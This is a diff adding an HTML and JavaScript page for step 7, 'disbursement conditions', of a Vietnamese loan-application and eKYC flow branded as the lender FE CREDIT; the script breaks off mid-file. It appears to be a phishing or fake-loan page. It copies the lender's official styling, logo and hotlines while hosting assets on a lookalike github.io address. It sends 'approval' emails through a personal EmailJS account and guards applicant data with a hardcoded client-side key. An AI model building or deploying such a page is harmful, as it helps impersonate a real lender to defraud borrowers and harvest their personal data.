@@ -1,0 +1,1396 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="vi" class="no-js usn">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover" />
+    <title>Điều Kiện Giải Ngân - FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP</title>
+    
+    <!-- External CSS Bundles from index.html -->
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-ltr-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-small-header-01-sm-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen and (min-width:0) and (max-width:991px)" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-large-header-07-lg-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen and (min-width:992px)" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/css-customs-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    <link href="https://www.fecredit.com.vn/sb/css-footer-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" type="image/svg" href="https://www-cdn.fecredit.com.vn/media/yienoinl/favicon-feonl-01.svg?width=32&height=32">
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+    
+    <!-- Unified Design Tokens -->
+    <link rel="stylesheet" href="../../configs/shared/fecredit-design-tokens.css" />
+    
+    <!-- Step 1 Style Guide -->
+    <link rel="stylesheet" href="step1-style-guide.css">
+    
+    <style>
+      /* Design tokens are now imported from fecredit-design-tokens.css */
+      /* Only page-specific overrides here if needed */
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html, body {
+        overflow-x: hidden !important;
+        max-width: 100vw !important;
+        width: 100% !important;
+      }
+
+      body {
+        font-family: "Roboto", sans-serif;
+        font-size: var(--fecredit-font-size-base);
+        background-color: var(--fecredit-bg-secondary);
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100dvh;
+        color: var(--fecredit-text-primary);
+      }
+
+      /* Site Structure */
+      #site {
+        display: flex;
+        flex-direction: column;
+        min-height: 100dvh;
+      }
+
+      /* Subheader */
+      #site-subheader {
+        background: var(--fecredit-white);
+        border-bottom: 1px solid var(--fecredit-border);
+        padding: var(--fecredit-space-2) 0;
+      }
+      
+      .sub-header-nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 12px;
+      }
+      
+      .sub-header-list {
+        display: flex;
+        list-style: none;
+        gap: 24px;
+        margin: 0;
+        padding: 0;
+      }
+      
+      .sub-header-list li a {
+        color: var(--fecredit-text-secondary);
+        text-decoration: none;
+        font-size: var(--fecredit-font-size-sm);
+        transition: color var(--fecredit-transition-base);
+      }
+      
+      .sub-header-list li a:hover {
+        color: var(--fecredit-primary);
+      }
+      
+      .site-search-form {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+      }
+      
+      .site-search-form input {
+        padding: 6px 12px;
+        border: 1px solid #ECECEC;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+      
+      .site-search-form button {
+        padding: 6px 12px;
+        background: var(--primary-color);
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+
+      /* FE Credit Header */
+      #site-header {
+        background: #fff;
+        border-bottom: 1px solid #ECECEC;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+        padding: 15px 0;
+      }
+      
+      #site-header .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 15px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      
+      #logo a {
+        display: flex;
+        align-items: center;
+        text-decoration: none;
+        gap: 10px;
+      }
+      
+      #logo img {
+        height: 40px;
+        max-width: 200px;
+        object-fit: contain;
+      }
+      
+      #logo span {
+        font-size: 14px;
+        font-weight: 600;
+        color: var(--primary-color);
+        display: none;
+      }
+      
+      .nav__menu {
+        display: flex;
+        list-style: none;
+        gap: 24px;
+        margin: 0;
+        padding: 0;
+      }
+      
+      .nav__menu li a {
+        color: var(--text-dark);
+        text-decoration: none;
+        font-weight: 500;
+        font-size: 15px;
+        transition: color 0.3s;
+      }
+      
+      .nav__menu li a:hover {
+        color: var(--primary-color);
+      }
+      
+      .hamburger {
+        display: none;
+        background: none;
+        border: 2px solid var(--primary-color);
+        border-radius: 8px;
+        padding: 8px;
+        cursor: pointer;
+      }
+      
+      .hamburger span {
+        display: block;
+        width: 25px;
+        height: 3px;
+        background: var(--primary-color);
+        margin: 5px 0;
+        transition: all 0.3s ease;
+      }
+      
+      /* Legacy header for compatibility */
+      .fecredit-header {
+        display: none;
+      }
+      
+      @media (min-width: 992px) {
+        #logo span {
+          display: inline-block;
+        }
+      }
+      
+      @media (max-width: 991px) {
+        .sub-header-nav {
+          flex-direction: column;
+          gap: 12px;
+        }
+
+        .site-search-form {
+          width: 100%;
+        }
+
+        .nav__menu {
+          display: none;
+          flex-direction: column;
+          position: absolute;
+          top: 100%;
+          left: 0;
+          width: 100%;
+          background: #fff;
+          box-shadow: 0 12px 40px rgba(0, 153, 79, 0.12);
+          padding: 20px;
+          gap: 16px;
+        }
+
+        .nav__menu.show {
+          display: flex;
+        }
+
+        .hamburger {
+          display: block;
+        }
+      }
+
+      .header {
+        padding: 15px;
+        background-color: var(--primary-color);
+        border-bottom: 1px solid rgba(255, 255, 255, 0.18);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        position: sticky;
+        top: 0;
+        z-index: 10;
+        display: none;
+      }
+
+      .header img {
+        height: 35px;
+      }
+
+      .header-icons {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        color: #ffffff;
+      }
+
+      .header-icons i {
+        font-size: 24px;
+        cursor: pointer;
+        color: inherit;
+        transition: color 0.3s ease;
+      }
+
+      .header-icons i:hover {
+        color: var(--primary-color);
+      }
+
+      main {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        padding: clamp(20px, 6vw, 48px) clamp(16px, 5vw, 36px);
+      }
+
+      /* Fixed padding for mobile */
+      @media (max-width: 767px) {
+        /* Prevent all elements from overflowing */
+        * {
+          max-width: 100% !important;
+        }
+
+        img {
+          max-width: 100% !important;
+          height: auto !important;
+        }
+
+        main {
+          padding: 12px !important;
+          width: 100% !important;
+          max-width: 100% !important;
+        }
+      }
+
+      .container-card {
+        width: min(100%, 760px);
+        background: #ffffff;
+        border-radius: 20px;
+        box-shadow: 0 12px 40px rgba(0, 153, 79, 0.12);
+        padding: clamp(24px, 5vw, 48px);
+        display: flex;
+        flex-direction: column;
+        gap: clamp(20px, 3vw, 32px);
+        color: var(--primary-color, #00994F);
+      }
+
+      /* Fixed padding and gap for mobile */
+      @media (max-width: 767px) {
+        .container-card {
+          padding: 16px !important;
+          gap: 16px !important;
+          width: 100% !important;
+          max-width: 100% !important;
+        }
+      }
+
+      .progress-percentage {
+        text-align: center;
+        font-size: 1rem;
+        color: var(--primary-color);
+        margin-bottom: 10px;
+      }
+
+      .nav-tabs {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin: 0;
+        padding: 0;
+        list-style: none;
+        flex-wrap: wrap;
+      }
+
+      .nav-tabs .nav-link {
+        background-color: rgba(0, 153, 79, 0.12);
+        color: var(--primary-color);
+        border-radius: 999px;
+        padding: 8px 18px;
+        font-weight: 600;
+        font-size: 14px;
+        border: none;
+        transition: all 0.3s ease;
+      }
+
+      .nav-tabs .nav-link.active {
+        background-color: var(--primary-color);
+        color: #ffffff;
+        box-shadow: 0 8px 15px rgba(0, 153, 79, 0.25);
+      }
+
+      .nav-tabs .nav-link:hover {
+        background-color: var(--primary-light);
+        color: var(--primary-dark);
+      }
+
+      .step-title {
+        color: var(--primary-color);
+        font-size: clamp(1.25rem, 2.5vw, 1.5rem);
+        font-weight: 700;
+        text-transform: uppercase;
+        text-align: center;
+        margin: 0;
+      }
+
+      /* Fixed font size for mobile */
+      @media (max-width: 767px) {
+        .step-title {
+          font-size: 16px !important;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .step-title {
+          font-size: 14px !important;
+        }
+      }
+
+      .step-description {
+        font-size: 0.95rem;
+        text-align: center;
+        color: rgba(32, 43, 60, 0.75);
+        margin: 0;
+      }
+
+      .image-section {
+        text-align: center;
+      }
+
+      .canvas-container {
+        position: relative;
+        margin: 20px auto;
+        max-width: 100%;
+        width: 100%;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        border-radius: 12px;
+        border: 2px solid rgba(0, 153, 79, 0.08);
+        background: rgba(0, 153, 79, 0.03);
+      }
+
+      #disbursementCanvas {
+        width: 100%;
+        height: auto;
+        display: block;
+        background: #ffffff;
+      }
+
+      /* Fixed canvas size for mobile */
+      @media (max-width: 767px) {
+        .canvas-container {
+          width: 100% !important;
+          max-width: 100% !important;
+        }
+        
+        #disbursementCanvas {
+          width: 100% !important;
+          max-width: 100% !important;
+          height: auto !important;
+          aspect-ratio: 1240 / 1754 !important;
+          max-height: 80vh !important;
+        }
+      }
+
+      #disbursementCanvas.loading {
+        opacity: 0.5;
+        background: url("https://via.placeholder.com/80x80?text=...") center / 40px 40px no-repeat;
+      }
+
+      .button-group {
+        display: flex;
+        justify-content: center;
+        gap: 16px;
+        flex-wrap: wrap;
+      }
+
+      .btn-download {
+        background-color: #17a2b8;
+        color: #ffffff;
+        font-size: 14px;
+        font-weight: 700;
+        padding: 10px 22px;
+        border-radius: 999px;
+        border: none;
+        transition: transform 0.25s ease, box-shadow 0.25s ease;
+      }
+
+      .btn-download:hover {
+        background-color: var(--accent-color);
+        transform: translateY(-1px);
+        box-shadow: 0 8px 18px rgba(255, 98, 0, 0.35);
+      }
+
+      .btn-primary {
+        background-color: var(--primary-color);
+        border: none;
+        border-radius: 999px;
+        padding: 10px 22px;
+        font-weight: 700;
+        font-size: 14px;
+        transition: transform 0.25s ease, box-shadow 0.25s ease;
+      }
+
+      .btn-primary:hover {
+        background-color: var(--primary-dark);
+        box-shadow: 0 8px 18px rgba(0, 153, 79, 0.35);
+        transform: translateY(-1px);
+      }
+
+      .divider-blue {
+        border-top: 1px solid rgba(0, 153, 79, 0.15);
+        margin: 15px 0;
+      }
+
+      .error-message {
+        color: #ff4d4f;
+        font-size: 14px;
+        font-weight: 500;
+        text-align: center;
+        margin-top: 5px;
+        padding: 6px 10px;
+        background-color: #ffe6e6;
+        border-radius: 6px;
+        display: none;
+      }
+
+      .footer {
+        text-align: center;
+        padding: 24px 16px;
+        background-color: var(--primary-color);
+        color: #ffffff;
+        font-size: 12px;
+      }
+
+      .footer-links {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .footer-links a {
+        color: rgba(255, 255, 255, 0.7);
+        text-decoration: none;
+        transition: color 0.3s ease;
+      }
+
+      .footer-links a:hover {
+        color: var(--primary-light);
+      }
+
+      /* Mobile Responsive - Fixed Sizes */
+      @media (max-width: 767px) {
+        /* Subheader Mobile */
+        #site-subheader {
+          padding: 6px 0;
+        }
+        
+        .sub-header-nav {
+          flex-direction: column;
+          gap: 8px;
+          padding: 0 12px;
+        }
+        
+        .sub-header-list {
+          flex-wrap: wrap;
+          gap: 12px;
+          font-size: 12px;
+        }
+        
+        .sub-header-list li a {
+          font-size: 12px;
+          padding: 4px 0;
+        }
+        
+        .site-search-form {
+          width: 100%;
+        }
+        
+        .site-search-form input {
+          flex: 1;
+          font-size: 14px;
+          padding: 8px 12px;
+          min-height: 36px;
+        }
+        
+        .site-search-form button {
+          min-width: 44px;
+          min-height: 36px;
+          padding: 8px 12px;
+        }
+
+        /* Header Mobile */
+        #site-header {
+          padding: 10px 0;
+        }
+        
+        #site-header .container {
+          padding: 0 12px;
+        }
+        
+        #logo img {
+          height: 32px;
+          max-width: 140px;
+        }
+        
+        .hamburger {
+          display: block;
+          min-width: 44px;
+          min-height: 44px;
+          padding: 10px;
+        }
+        
+        .hamburger span {
+          width: 22px;
+          height: 2.5px;
+        }
+
+        .nav__menu {
+          display: none;
+          flex-direction: column;
+          position: absolute;
+          top: 100%;
+          left: 0;
+          width: 100%;
+          background: #fff;
+          box-shadow: 0 12px 40px rgba(0, 153, 79, 0.12);
+          padding: 20px;
+          gap: 16px;
+        }
+
+        .nav__menu.show {
+          display: flex;
+        }
+
+        /* Main Mobile */
+        main {
+          padding: 12px;
+        }
+
+        .container-card {
+          padding: 16px;
+          border-radius: 12px;
+          gap: 16px;
+        }
+
+        .nav-tabs {
+          gap: 6px;
+          flex-wrap: wrap;
+        }
+
+        .nav-tabs .nav-link {
+          font-size: 11px;
+          padding: 6px 12px;
+          min-height: 36px;
+        }
+
+        .step-title {
+          font-size: 16px;
+          margin-bottom: 12px;
+        }
+
+        .step-description {
+          font-size: 13px;
+          margin-bottom: 16px;
+        }
+
+        .canvas-container {
+          margin: 16px auto;
+          border-radius: 8px;
+        }
+
+        #disbursementCanvas {
+          border-radius: 8px;
+        }
+
+        .button-group {
+          flex-direction: column;
+          gap: 10px;
+        }
+
+        .btn-download,
+        .btn-primary {
+          width: 100%;
+          min-height: 48px;
+          padding: 12px 20px;
+          font-size: 14px;
+        }
+
+        /* Footer Mobile */
+        .footer {
+          padding: 20px 12px;
+          font-size: 11px;
+        }
+
+        .footer-links {
+          flex-direction: column;
+          gap: 8px;
+        }
+
+        .footer-links a {
+          display: block;
+          margin: 4px 0;
+        }
+
+        footer p {
+          font-size: 11px;
+          margin: 6px 0;
+          line-height: 1.4;
+        }
+      }
+
+      @media (max-width: 991px) {
+        .sub-header-nav {
+          flex-direction: column;
+          gap: 12px;
+        }
+
+        .site-search-form {
+          width: 100%;
+        }
+
+        .nav__menu {
+          display: none;
+          flex-direction: column;
+          position: absolute;
+          top: 100%;
+          left: 0;
+          width: 100%;
+          background: #fff;
+          box-shadow: 0 12px 40px rgba(0, 153, 79, 0.12);
+          padding: 20px;
+          gap: 16px;
+        }
+
+        .nav__menu.show {
+          display: flex;
+        }
+
+        .hamburger {
+          display: block;
+        }
+      }
+
+      /* Small Mobile (max-width: 480px) */
+      @media (max-width: 480px) {
+        .container-card {
+          padding: 12px;
+        }
+
+        .nav-tabs .nav-link {
+          font-size: 10px;
+          padding: 5px 10px;
+        }
+
+        .step-title {
+          font-size: 14px;
+        }
+
+        .step-description {
+          font-size: 12px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Site -->
+    <div id="site">
+        <!-- Subheader -->
+        <div id="site-subheader">
+            <div class="container content">
+                <nav aria-label="" class="sub-header-nav secondary nav-dropdown navigation-dropdown-bg navigation-dropdown-bg-solid">
+                    <ul class="sub-header-list d-flex">
+                        <li>
+                            <span>
+                                <a href="../index.html">Về chúng tôi</a>
+                            </span>
+                        </li>
+                        <li>
+                            <span>
+                                <a href="https://feonline.fecredit.com.vn/" target="_blank" rel="noreferrer noopener">Về FE ONLINE 2.0</a>
+                            </span>
+                        </li>
+                        <li>
+                            <span>
+                                <a href="#site-footer">Liên hệ</a>
+                            </span>
+                        </li>
+                    </ul>
+                    <!--// Site search -->
+                    <div class="form site-search-form site-search" aria-label="">
+                        <form role="search" autocomplete="off" form-group="off" action="https://www.fecredit.com.vn/search/" method="get" name="searchForm">
+                            <div class="form-group">
+                                <input type="text" class="myInput form-control" name="search_field"
+                                       aria-label="" placeholder="Bạn cần tìm gì?"
+                                       value="">
+                            </div>
+                            <button id="search-button" type="submit" role="button"
+                                    aria-label=""
+                                    class="btn base-btn-bg base-btn-bg-solid base-btn-bg-hover-solid base-btn-text base-btn-borders btn-search">
+                                <span></span>
+                                <i aria-hidden="true" class="icon ti ti-search"></i>
+                                <p>Tìm kiếm</p>
+                            </button>
+                        </form>
+                    </div>
+                </nav>
+            </div>
+        </div>
+
+        <!-- Header -->
+        <header id="site-header" class="header-bg header-bg-solid" tabindex="-1">
+            <div class="container">
+                <div class="row justify-content-between">
+                    <div class="d-flex align-items-center nav-left">
+                        <div id="logo">
+                            <a href="../index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" class="w-100">
+                                <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT Logo"
+                                     style="object-fit: contain;width:100%">
+                                <span>FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP</span>
+                            </a>
+                        </div>
+                        <!-- Main navigation -->
+                        <nav aria-label="" id="nav-menu"
+                             class="main nav__menu nav-dropdown align-items-center navigation-dropdown-bg navigation-dropdown-bg-solid">
+                            <ul class="nav__list">
+                                <li class="no-child">
+                                    <span>
+                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="../index.html">Trang Chủ</a>
+                                    </span>
+                                </li>
+                                <li class="no-child">
+                                    <span>
+                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="loan_registration.html">Đăng Ký Vay</a>
+                                    </span>
+                                </li>
+                                <li class="no-child">
+                                    <span>
+                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="#site-footer">Liên Hệ</a>
+                                    </span>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Content -->
+        <main id="site-content" tabindex="-1">
+        <!-- Banner đã bị xóa để form gọn hơn -->
+        
+        <!-- Steps Progress -->
+        <div class="steps" role="progressbar" aria-label="Registration Progress">
+          <div class="step" id="step1">1. THÔNG TIN CÁ NHÂN</div>
+          <div class="step" id="step2">2. THÔNG TIN KHOẢN VAY</div>
+          <div class="step active" id="step3" aria-current="step">3. XÁC THỰC eKYC</div>
+        </div>
+        
+      <div class="container-card">
+        <ul class="nav nav-tabs">
+          <li class="nav-item">
+            <a class="nav-link" href="step1.html">1. Nhập thông tin</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="step4.html">2. Xác thực và xử lý</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="step7.html">3. Hoàn thành</a>
+          </li>
+        </ul>
+
+        <section id="step7" class="step-transition">
+          <h5 class="step-title">Điều Kiện Giải Ngân</h5>
+          <div class="error-message" id="formError"></div>
+          <p class="step-description">
+            Dưới đây là các điều kiện giải ngân của khoản vay. Vui lòng kiểm tra kỹ thông tin.
+          </p>
+          <div class="image-section">
+            <div class="canvas-container">
+              <canvas id="disbursementCanvas" aria-label="Điều kiện giải ngân"></canvas>
+            </div>
+          </div>
+          <hr class="divider-blue" />
+            <div class="button-group">
+              <a href="step6.html" class="btn btn-primary">HỢP ĐỒNG VAY</a>
+              <button id="downloadDisbursementBtn" class="btn btn-download" disabled>
+                TẢI XUỐNG
+              </button>
+              <button
+                id="proceedToFinalStepBtn"
+                type="button"
+                class="btn btn-primary"
+                data-next-url="step8.html"
+                disabled
+              >
+                TIẾP TỤC
+              </button>
+            </div>
+        </section>
+      </div>
+    </main>
+
+        <!-- Footer -->
+        <footer id="site-footer" class="footer-bg footer-bg-solid bg-gray-1" tabindex="-1" style="padding-bottom:0px !important">
+            <div class="container">
+                <div class="listing">
+                    <div class="item footer-item usn_pod_footeritem col-lg-0 col-md-0 col-12 col">
+                        <div class="inner">
+                            <div id="footer-item-above" class="d-flex flex-column align-stretch align-items-start gap24 xl:flex-row">
+                                <div class="footer-text d-flex flex-column align-stretch gap32">
+                                    <div class="image">
+                                        <img class="lazyload" loading="lazy" src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="logo" />
+                                    </div>
+                                    <h2 class="heading footer-heading">Hiện thực hóa<div class="break"></div>hàng triệu ước mơ</h2>
+                                </div>
+                                <div class="footer-contact d-flex flex-column justify-content-center align-items-start align-stretch p24 gap24 radius24 bg-white">
+                                    <div class="contact-phone d-flex flex-column align-stretch xl:flex-row gap24">
+                                        <div class="new-customer flex-center flex-column align-stretch">
+                                            <p class="contact-title"><i class="ti ti-phone-call contact-icon"></i>Dành cho khách hàng mới</p>
+                                            <a class="phone-link flex-center flex-column fw-700 lh150 radius16 text-uppercase c8-bg c8-bg-solid" href="tel:028 3551 6868">
+                                                <span class="c8-secondary-heading">Hỗ trợ vay nhanh</span>
+                                                <h5 class="heading c8-heading">028 3551 6868</h5>
+                                            </a>
+                                        </div>
+                                        <div class="phone-divider align-stretch bg-gray-2"></div>
+                                        <div class="old-customer gap16 flex-center flex-column align-stretch">
+                                            <p class="contact-title"><i class="ti ti-headphones contact-icon"></i> Dành cho khách hàng hiện hữu</p>
+                                            <div class="list-phone flex-center align-stretch radius16 c9-bg c9-bg-solid">
+                                                <a class="phone-link align-stretch flex-center flex-column fw-700 lh150 text-uppercase" href="tel:1900 6535">
+                                                    <span class="c9-secondary-heading">Khách hàng vay</span>
+                                                    <h5 class="heading c9-heading">1900 6535</h5>
+                                                </a>
+                                                <div class="old-customer-divider"></div>
+                                                <a class="phone-link align-stretch flex-center flex-column fw-700 lh150 text-uppercase" href="tel:1900 6939">
+                                                    <span class="c9-secondary-heading mobile">KH thẻ tín dụng</span>
+                                                    <span class="c9-secondary-heading desktop">Khách hàng thẻ tín dụng</span>
+                                                    <h5 class="heading c9-heading">1900 6939</h5>
+                                                </a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="divider-contact"></div>
+                                    <div class="other-contact flex-center gap32">
+                                        <div class="social d-flex flex-column justify-content-center align-items-start">
+                                            <p class="contact-title">
+                                                <i class="ti ti-share contact-icon"></i> Kết nối với FE CREDIT nhiều hơn
+                                            </p>
+                                            <div class="social-list d-flex align-items-center">
+                                                <a href="https://www.facebook.com/FECREDIT.VN/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/20qdzdk0/fb44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.instagram.com/fecredit_official/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/rfybl10x/it44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.linkedin.com/company/fe-credit/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/wwfcyngn/lb44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.youtube.com/channel/UCVEbuhfBLKok_Jpl4VZVV1A/about" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/104pogye/yb44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://www.tiktok.com/@fecredit_official" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/v15j2slx/tt44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                                <a href="https://zalo.me/FECREDIT" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
+                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/wzrnvejd/zl44.svg" alt="social-icon" class="lazyload" />
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <div class="address flex-center flex-column align-stretch">
+                                            <p class="contact-title"><i class="ti ti-map-pin contact-icon"></i>Địa chỉ</p>
+                                            <div class="address-content align-stretch flex-column d-flex gap-0">
+                                                <p class="address-title text-gray-8 fw-700 text-uppercase lh150">Phòng Dịch Vụ Khách Hàng</p>
+                                                <div class="address-text text-gray-6 lh150 ls28">
+                                                    <p class="addressFooter">144 Cộng Hòa, Phường Bảy Hiền, Thành phố Hồ Chí Minh.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
+    <script>
+      emailjs.init("OrBsI926QI2_xBh1f");
+
+      const DISBURSEMENT_IMAGE_PATH = new URL(
+        "https://fecredit.github.io/assets/img/dieukiengiayngan.png",
+        window.location.href
+      ).href;
+
+        let userData = {};
+        let canProceedToStep8 = false;
+        let redirectTimeoutId = null;
+        const ACTION_BUTTONS_SELECTOR = "#downloadDisbursementBtn, #proceedToFinalStepBtn";
+
+        function setActionButtonsEnabled(enabled) {
+          $(ACTION_BUTTONS_SELECTOR).prop("disabled", !enabled);
+        }
+
+        function showFormMessage(message, color) {
+          const $formError = $("#formError");
+          if (!message) {
+            $formError.text("").css("color", "").hide();
+            return;
+          }
+          if (color) {
+            $formError.css("color", color);
+          } else {
+            $formError.css("color", "");
+          }
+          $formError.text(message).show();
+        }
+
+        function scheduleRegistrationRedirect(delay = 3000) {
+          if (redirectTimeoutId) {
+            return;
+          }
+          redirectTimeoutId = setTimeout(() => {
+            window.location.href = "loan_registration.html";
+          }, delay);
+        }
+
+      function formatNumber(number) {
+        if (!number || number === "N/A" || number === 0) return "";
+        return Number(number).toLocaleString("vi-VN");
+      }
+
+      function splitDate(dateStr) {
+        if (!dateStr || typeof dateStr !== "string" || !/^\d{4}-\d{2}-\d{2}$/.test(dateStr) || dateStr === "N/A") {
+          return { day: "", month: "", year: "" };
+        }
+        const [year, month, day] = dateStr.split("-");
+        return { day: day || "", month: month || "", year: year || "" };
+      }
+
+      function calculateDueDate(disbursementDate, loanTerm) {
+        if (
+          !disbursementDate ||
+          !loanTerm ||
+          typeof disbursementDate !== "string" ||
+          !/^\d{4}-\d{2}-\d{2}$/.test(disbursementDate) ||
+          disbursementDate === "N/A"
+        ) {
+          return "";
+        }
+        const date = new Date(disbursementDate);
+        if (isNaN(date.getTime())) {
+          return "";
+        }
+        date.setMonth(date.getMonth() + parseInt(loanTerm, 10));
+        if (isNaN(date.getTime())) {
+          return "";
+        }
+        return date.toISOString().split("T")[0];
+      }
+
+      function generateRandomCode(prefix) {
+        const randomNum = Math.floor(100000 + Math.random() * 900000);
+        return `${prefix}${randomNum}`;
+      }
+
+        function saveToLocalStorage() {
+          try {
+            const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), "fecredit-secret-key").toString();
+            localStorage.setItem("userData", encryptedData);
+            // Data saved successfully
+          } catch (error) {
+            // Error saving userData
+            if (window.Logger) {
+              window.Logger.error("Lỗi lưu trữ dữ liệu bước 7:", error);
+            }
+            showFormMessage("Lỗi lưu dữ liệu. Vui lòng thử lại.");
+          }
+        }
+
+        function loadUserData() {
+          canProceedToStep8 = false;
+          setActionButtonsEnabled(false);
+          try {
+            const storedData = localStorage.getItem("userData");
+            if (!storedData) {
+              showFormMessage("Không tìm thấy dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.");
+              scheduleRegistrationRedirect();
+              return;
+            }
+
+            userData = JSON.parse(
+              CryptoJS.AES.decrypt(storedData, "fecredit-secret-key").toString(CryptoJS.enc.Utf8)
+            );
+
+            Object.keys(userData).forEach((key) => {
+              if (userData[key] === "N/A" || userData[key] === 0) {
+                userData[key] = "";
+              }
+            });
+
+            if (!userData.isRegistered || !userData.fullName) {
+              showFormMessage("Không tìm thấy hồ sơ đã đăng ký. Vui lòng quay lại bước đăng ký.");
+              scheduleRegistrationRedirect();
+              return;
+            }
+
+            canProceedToStep8 = true;
+            showFormMessage("");
+          } catch (error) {
+            if (window.Logger) {
+              window.Logger.error("Không thể giải mã dữ liệu bước 7:", error);
+            }
+            showFormMessage("Lỗi tải dữ liệu. Vui lòng quay lại bước đăng ký.");
+            scheduleRegistrationRedirect();
+          }
+        }
+
+        function sendApprovalEmail() {
+          if (!userData.email) {
+            showFormMessage("Không tìm thấy địa chỉ email. Vui lòng quay lại bước đăng ký.");
+            return;
+          }
+
+          if (typeof emailjs === "undefined") {
+            showFormMessage(
+              "Không thể gửi email xác nhận. Vui lòng liên hệ trực tiếp.",
+              "#00994F"
+            );
+            return;
+          }
+
+          const templateParams = {
+            full_name: userData.fullName || "Quý khách",
+            loan_code: userData.loanCode || generateRandomCode("SHB"),
+            to_email: userData.email,
+          };
+
+          emailjs
+            .send("service_60tgxof", "template_uhyb8ve", templateParams)
+            .then(() => {
+              showFormMessage(
+                `Email thông báo đã được gửi đến ${userData.email}`,
+                "#28a745"
+              );
+            })
+            .catch((error) => {
+              if (window.Logger) {
+                window.Logger.error("Không thể gửi email xác nhận:", error);
+              }
+              showFormMessage(
+                "Email không được gửi. Vui lòng liên hệ trực tiếp để xác nhận.",
+                "#00994F"
+              );
+            });
+        }
+
